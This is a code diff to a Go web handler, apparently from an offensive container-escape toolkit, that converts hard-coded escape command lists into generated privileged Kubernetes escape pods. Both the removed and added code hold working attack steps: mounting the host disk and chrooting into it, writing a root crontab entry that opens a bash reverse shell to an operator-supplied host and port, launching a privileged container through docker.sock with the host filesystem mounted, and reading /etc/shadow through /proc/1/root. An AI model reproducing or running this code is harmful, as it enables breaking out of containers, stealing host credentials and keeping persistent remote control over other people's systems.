@@ -3,8 +3,10 @@ package handler
 import (
 	"fmt"
 	"net/http"
+	"strings"
 
 	"github.com/gin-gonic/gin"
+	"sigs.k8s.io/yaml"
 )
 
 type EscapeHandler struct{}
@@ -47,21 +49,31 @@ func (h *EscapeHandler) PrivilegedEscape(c *gin.Context) {
 		req.TimeoutSec = 10
 	}
 
-	escapeCmds := []string{
-		// Mount host disk via /dev
-		"fdisk -l",
-		"mkdir -p /tmp/host",
-		"mount /dev/sda1 /tmp/host",
-		// Chroot escape
-		"chroot /tmp/host /bin/sh -c 'echo \"privileged escape successful\"'",
-		// Crontab persistence
-		fmt.Sprintf("echo '* * * * * root /bin/bash -c \"/bin/bash -i >& /dev/tcp/%s/%s 0>&1\"' >> /tmp/host/etc/crontab", req.LHost, req.LPort),
+	pod := buildEscapePodObject(escapePodRequest{
+		Namespace:  req.Namespace,
+		EscapeMode: "privileged",
+	})
+	body, err := yaml.Marshal(pod)
+	if err != nil {
+		c.JSON(http.StatusOK, gin.H{"error": "marshal escape pod yaml: " + err.Error()})
+		return
 	}
-	c.JSON(http.StatusOK, gin.H{"commands": escapeCmds})
+	c.JSON(http.StatusOK, gin.H{
+		"yaml":             string(body),
+		"escape_mode":      "privileged",
+		"namespace":        req.Namespace,
+		"pod_name":         pod.Name,
+		"commands":         extractCommandStrings((&CDKHandler{}).getExploitCommands("privileged")),
+		"exploit_commands": (&CDKHandler{}).getExploitCommands("privileged"),
+		"description":      getEscapeDescription("privileged"),
+		"compat":           true,
+	})
 }
 
 func (h *EscapeHandler) MountEscape(c *gin.Context) {
 	var req struct {
+		TargetHost string `json:"target_host"`
+		Namespace  string `json:"namespace"`
 		EscapeType string `json:"escape_type" binding:"required"`
 		LHost      string `json:"lhost" binding:"required"`
 		LPort      string `json:"lport" binding:"required"`
@@ -70,35 +82,64 @@ func (h *EscapeHandler) MountEscape(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 		return
 	}
-
-	escapeMethods := map[string][]string{
-		"chroot": {
-			"mkdir -p /tmp/host_escape",
-			"mount /dev/sda1 /tmp/host_escape 2>/dev/null || mount /dev/vda1 /tmp/host_escape 2>/dev/null",
-			"chroot /tmp/host_escape /bin/sh",
-		},
-		"crontab": {
-			"mkdir -p /tmp/host_escape",
-			"mount /dev/sda1 /tmp/host_escape 2>/dev/null || mount /dev/vda1 /tmp/host_escape 2>/dev/null",
-			fmt.Sprintf("echo '* * * * * root /bin/bash -c \"/bin/bash -i >& /dev/tcp/%s/%s 0>&1\"' >> /tmp/host_escape/etc/crontab", req.LHost, req.LPort),
-		},
-		"docker.sock": {
-			"docker -H unix:///var/run/docker.sock run -d --privileged --net=host -v /:/host ubuntu:latest /bin/sh -c 'while true; do sleep 3600; done'",
-			"docker -H unix:///var/run/docker.sock ps",
-		},
-		"procfs": {
-			"# Mount host procfs to access host processes",
-			"mount -t proc proc /mnt/proc 2>/dev/null",
-			"cat /proc/1/root/etc/shadow 2>/dev/null",
-		},
+	if strings.TrimSpace(req.Namespace) == "" {
+		req.Namespace = "default"
 	}
 
-	cmds, ok := escapeMethods[req.EscapeType]
+	mode, customCommand, ok := legacyEscapeTypeToCDKConfig(req.EscapeType, req.LHost, req.LPort)
 	if !ok {
 		c.JSON(http.StatusBadRequest, gin.H{"error": "unsupported escape type", "available": []string{"chroot", "crontab", "docker.sock", "procfs"}})
 		return
 	}
-	c.JSON(http.StatusOK, gin.H{"escape_type": req.EscapeType, "commands": cmds})
+	pod := buildEscapePodObject(escapePodRequest{
+		Namespace:  req.Namespace,
+		EscapeMode: mode,
+		Command:    customCommand,
+	})
+	body, err := yaml.Marshal(pod)
+	if err != nil {
+		c.JSON(http.StatusOK, gin.H{"error": "marshal escape pod yaml: " + err.Error()})
+		return
+	}
+	handler := &CDKHandler{}
+	c.JSON(http.StatusOK, gin.H{
+		"yaml":             string(body),
+		"escape_type":      req.EscapeType,
+		"escape_mode":      mode,
+		"namespace":        req.Namespace,
+		"pod_name":         pod.Name,
+		"commands":         extractCommandStrings(handler.getExploitCommands(mode)),
+		"exploit_commands": handler.getExploitCommands(mode),
+		"description":      getEscapeDescription(mode),
+		"compat":           true,
+	})
+}
+
+func legacyEscapeTypeToCDKConfig(escapeType, lhost, lport string) (string, string, bool) {
+	switch strings.TrimSpace(escapeType) {
+	case "chroot":
+		return "privileged", "", true
+	case "crontab":
+		crontabLine := fmt.Sprintf("* * * * * root /bin/bash -c \"/bin/bash -i >& /dev/tcp/%s/%s 0>&1\"", lhost, lport)
+		command := fmt.Sprintf("echo %s >> /host/etc/crontab 2>/dev/null || echo 'write crontab failed'; sleep 3600", shellQuoteSingle(crontabLine))
+		return "privileged", command, true
+	case "docker.sock":
+		return "docker-sock", "", true
+	case "procfs":
+		return "host-proc", "", true
+	default:
+		return "", "", false
+	}
+}
+
+func extractCommandStrings(items []gin.H) []string {
+	commands := make([]string, 0, len(items))
+	for _, item := range items {
+		if command, ok := item["cmd"].(string); ok {
+			commands = append(commands, command)
+		}
+	}
+	return commands
 }
 
 func (h *EscapeHandler) KernelVulnerabilities(c *gin.Context) {
